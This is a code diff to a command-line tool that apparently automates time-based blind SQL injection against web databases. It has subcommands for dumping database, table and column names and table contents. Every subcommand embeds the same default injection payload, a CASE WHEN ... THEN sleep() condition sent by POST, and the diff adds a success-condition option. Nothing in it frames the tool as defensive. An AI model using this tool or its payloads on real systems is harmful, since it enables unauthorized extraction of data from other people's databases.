@@ -13,8 +13,9 @@ program.command('dump-db-names')
     .option(
         '-d, --data <data>',
         'request data',
-        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -')
-    .option('-t, --type <type>', 'type', 'blind')
+        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -'
+    )
+    .option('-c, --condition <string>', 'success condition')
     .option('-X, --method <method>', 'method', 'POST')
     .option('--timeout <timeout>', 'timeout', 1)
     .action((options) => {
@@ -28,8 +29,9 @@ program.command('dump-table-names')
     .option(
         '-d, --data <data>',
         'request data',
-        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -')
-    .option('-t, --type <type>', 'type', 'blind')
+        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -'
+    )
+    .option('-c, --condition <string>', 'success condition')
     .option('-X, --method <method>', 'method', 'POST')
     .option('--timeout <timeout>', 'timeout', 1)
     .action((options) => {
@@ -44,8 +46,9 @@ program.command('dump-column-names')
     .option(
         '-d, --data <data>',
         'request data',
-        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -')
-    .option('-t, --type <type>', 'type', 'blind')
+        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -'
+    )
+    .option('-c, --condition <string>', 'success condition')
     .option('-X, --method <method>', 'method', 'POST')
     .option('--timeout <timeout>', 'timeout', 1)
     .action((options) => {
@@ -61,8 +64,9 @@ program.command('dump-table-column')
     .option(
         '-d, --data <data>',
         'request data',
-        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -')
-    .option('-t, --type <type>', 'type', 'blind')
+        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -'
+    )
+    .option('-c, --condition <string>', 'success condition')
     .option('-X, --method <method>', 'method', 'POST')
     .option('--timeout <timeout>', 'timeout', 1)
     .action((options) => {
